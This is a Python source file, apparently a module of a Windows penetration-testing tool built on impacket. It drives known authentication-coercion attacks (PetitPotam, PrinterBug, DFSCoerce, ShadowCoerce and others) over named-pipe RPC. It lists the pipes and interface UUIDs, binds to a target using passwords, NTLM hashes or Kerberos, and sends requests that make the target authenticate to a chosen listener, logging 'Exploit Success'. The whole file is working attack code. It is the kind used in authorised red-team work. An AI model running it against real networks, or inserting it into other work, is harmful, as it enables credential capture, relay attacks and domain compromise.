from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT


class Coercer:
    def __init__(self, logger, timeout, methods):
        self.logger = logger
        self.timeout = timeout
        self.methods = methods

    def config(self):
        alias = {
            "MS_FSRVP": "ShadowCoerce",
            "MS_DFSNM": "DFSCoerce",
            "MS_EFSR": "Petitpotam",
            "MS_RPRN": "PrinterBug",
            "MS_EVEN": "CheeseOunce",
            "MS_WSP": "WSPCoerce"
        }
        config = {
            "MS_FSRVP": [
                {
                    "protocol": "ncacn_np",
                    "pipeName":  "Fssagentrpc",
                    "MSRPC_UUID": ("a8e0653c-2744-4389-a61d-7373df8b2292", "3.0"),
                },
            ],
            "MS_DFSNM": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "netdfs",
                    "MSRPC_UUID": ("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0"),
                }
            ],
            "MS_EFSR": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "lsarpc",
                    "MSRPC_UUID": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
                },
                {
                    "protocol": "ncacn_np",
                    "pipeName": "efsrpc",
                    "MSRPC_UUID": ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
                },
                {
                    "protocol": "ncacn_np",
                    "pipeName": "samr",
                    "MSRPC_UUID": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
                },
                {
                    "protocol": "ncacn_np",
                    "pipeName": "lsass",
                    "MSRPC_UUID": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
                },
                {
                    "protocol": "ncacn_np",
                    "pipeName": "netlogon",
                    "MSRPC_UUID": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
                }
            ],
            "MS_RPRN": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "spoolss",
                    "MSRPC_UUID": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                },
                {
                    "protocol": "ncacn_ip_tcp",
                    "pipeName": "[dcerpc]",
                    "MSRPC_UUID": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                },
            ],
            "MS_EVEN": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "eventlog",
                    "MSRPC_UUID": ("82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0"),
                },
            ],
            "MS_WSP": [
                {
                    "protocol": "ncacn_np",
                    "pipeName": "MsFteWds",
                    "MSRPC_UUID": "",
                }
            ]
        }
        return config, alias

    def connect(self, target, username, password, domain, lmhash, nthash, aesKey, doKerberos, dcHost, target_ip, coerce_method):
        if coerce_method["protocol"] == "ncacn_np":
            stringBinding = f'{coerce_method["protocol"]}:{target}[\\PIPE\\{coerce_method["pipeName"]}]'
        elif coerce_method["protocol"] == "ncacn_ip_tcp":
            stringBinding = epm.hept_map(target, uuidtup_to_bin(coerce_method["MSRPC_UUID"]), protocol="ncacn_ip_tcp")

        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        rpctransport.setRemoteHost(target_ip)
        rpctransport.set_connect_timeout(self.timeout)
        rpctransport.set_credentials(
            username=username,
            password=password,
            domain=domain,
            lmhash=lmhash,
            nthash=nthash,
            aesKey=aesKey,
        )

        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)

        dce = rpctransport.get_dce_rpc()
        dce.set_auth_level(RPC_C_AUTHN_GSS_NEGOTIATE if doKerberos else RPC_C_AUTHN_WINNT)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        self.logger.debug(f"Connecting to {stringBinding}")
        try:
            dce.connect()
            if coerce_method["MSRPC_UUID"]:
                dce.bind(uuidtup_to_bin(coerce_method["MSRPC_UUID"]))
        except Exception as e:
            self.logger.debug(f"Something went wrong when connect to {stringBinding}, check error status => {e!s}")
            return None
        self.logger.debug(f"[+] Successfully bound to {stringBinding}!")
        return dce
    
    def exploit(self, dce, target, listener, always_continue, ms_protocolName, exploitName, pipeName):
        exploit_success = False
        for method in self.methods:
            ProtocolName = method.__package__
            CoerceMethod = method.__name__.split(".")[1]
            if ProtocolName == ms_protocolName:
                self.logger.debug(f"Target: {target}: Sending {CoerceMethod}!")
                try:
                    method.request(dce, target, listener)
                except Exception as e:
                    exploit_success = self.handle_exception(CoerceMethod, exploitName, pipeName, e)
                else:
                    # For wspcoerce, it won't return rpc error when it success.
                    self.logger.highlight(f"{exploitName}: Exploit Success, {pipeName}\\{CoerceMethod}")
                    exploit_success = True
            if always_continue:
                exploit_success = False
            if exploit_success:
                break
    
    def handle_exception(self, CoerceMethod, exploitName, pipeName, e):
        if str(e).find("rpc_s_access_denied") >= 0 or str(e).find("ERROR_BAD_NETPATH") >= 0 or str(e).find("RPC_S_INVALID_NET_ADDR") >= 0:
            self.logger.debug(f"{exploitName}: Exploit Success with {CoerceMethod} method")
            self.logger.highlight(f"{exploitName}: Exploit Success, {pipeName}\\{CoerceMethod}")
            return True
        elif str(e).find("ERROR_NOT_SUPPORTED") >= 0:
            self.logger.debug(f"{exploitName}: Not Vulnerable")
        else:
            self.logger.debug(f"Something went wrong, check error status => {e!s}")
        return False